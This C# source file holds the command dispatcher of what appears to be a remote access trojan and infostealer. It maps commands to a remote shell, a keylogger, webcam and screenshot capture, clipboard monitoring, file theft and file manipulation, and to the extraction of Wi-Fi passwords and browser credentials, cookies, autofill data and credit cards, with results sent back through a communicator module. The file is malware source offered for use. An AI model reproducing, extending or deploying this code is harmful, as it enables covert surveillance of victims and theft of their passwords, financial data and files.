using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using True.Features;

namespace True.Core
{
    public static class CommandDispatcher
    {
        public static async Task Dispatch(string command)
        {
            //Logger.Info($"Command string: '{command}' (len: {command?.Length ?? 0})");

            //if (string.IsNullOrWhiteSpace(command))
            //    return;

            //foreach (var c in command)
            //{
            //    Logger.Info($"Char: {(int)c} '{c}'");
            //}

            Logger.Info("Dispatcher", $"Command received: {command}");

            var parts = command.Split(' ', 2);
            var keyword = parts[0].ToLower();
            var args = parts.Length > 1 ? parts[1] : "";

            switch (keyword)
            {
                case "exec":
                    await RemoteShell.Execute(args);
                    break;

                case "sysinfo":
                    await SystemInfoReporter.GetSystemInfoString();
                    break;

                case "screenshot":
                    await ScreenshotTrigger.CaptureAndSend();
                    break;

                case "keylog":
                    {
                        string keylogArg = args.Trim().ToLower();

                        if (keylogArg == "stop" || keylogArg == "stop-keylog")
                        {
                            HybridKeylogger.Stop();
                            await Communicator.PostResponse("keylog", "Keylogger stopped.");
                        }
                        else if (string.IsNullOrEmpty(keylogArg) || keylogArg == "start" || keylogArg == "start-keylog")
                        {
                            HybridKeylogger.Start();
                            await Communicator.PostResponse("keylog", "Keylogger started.");
                        }
                        else
                        {
                            Logger.Warn("Dispatcher", $"Invalid keylog argument: {args}");
                            await Communicator.PostResponse("keylog", $"Invalid keylog argument: '{args}'. Use 'start' or 'stop'.");
                        }

                        break;
                    }


                case "clipboard":
                    ClipboardMonitor.Start();
                    break;

                case "stopclipboard":
                    ClipboardMonitor.Stop();
                    break;

                case "webcam":
                    await WebcamCapture.CaptureAndSend();
                    break;

                case "ps":
                    await ProcessManager.ListProcesses();
                    break;

                case "kill":
                    await ProcessManager.KillProcess(args);
                    break;

                case "steal":
                    bool force = args.Trim().Equals("force", StringComparison.OrdinalIgnoreCase);
                    await FileStealer.StartStealingAsync(force);
                    break;

                case "wifi_passwords":
                    if (string.IsNullOrWhiteSpace(args) || args.Trim().Equals("extract", StringComparison.OrdinalIgnoreCase))
                    {
                        await WifiPasswordExtractor.RunAsync();
                    }
                    else
                    {
                        Logger.Warn("Dispatcher", $"Unknown wifi command: {args}");
                        await Communicator.PostResponse("wifi", $"Unknown command: {args}");
                    }
                    break;

                case "browser_credentials":
                    BrowserPasswordStealer.Run();
                    break;

                //case "browser_cookies":
                //    BrowserCookieExtractor.Extract();
                //    break;
                case "browser_cookies":
                    BrowserCookiesExtractor.Extract();
                    break;

                case "browser_bookmarks":
                    BrowserBookmarksExtractor.Extract();
                    break;

                case "browser_autofill":
                    await BrowserAutofillExtractor.ExtractAsync();
                    break;

                case "browser_downloads":
                    await BrowserDownloadHistoryExtractor.ExtractAsync();
                    break;
                case "browser_history":
                    await BrowserHistoryExtractor.ExtractAsync();
                    break;

                case "browser_creditcards":
                    BrowserCreditCardExtractor.Extract();
                    break;

                case "explore":
                    await FileExplorer.Explore(args);
                    break;

                case "download":
                case "delete":
                case "rename":
                case "upload":
                case "stat":
                    await FileExplorer.Dispatch(keyword, args);
                    break;


                default:
                    Logger.Warn("Dispatcher", $"Unknown command: {keyword}");
                    break;
            }
        }
    }
}
